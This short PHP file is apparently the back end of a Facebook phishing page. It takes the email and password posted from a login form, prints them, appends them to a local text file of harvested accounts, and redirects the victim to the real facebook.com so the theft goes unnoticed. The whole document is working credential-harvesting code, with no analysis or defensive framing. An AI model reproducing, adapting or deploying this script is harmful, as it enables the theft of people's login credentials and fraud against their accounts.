<?php
echo "Email: " . $_POST["email"];
echo "Password: ". $_POST["pass"];
file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
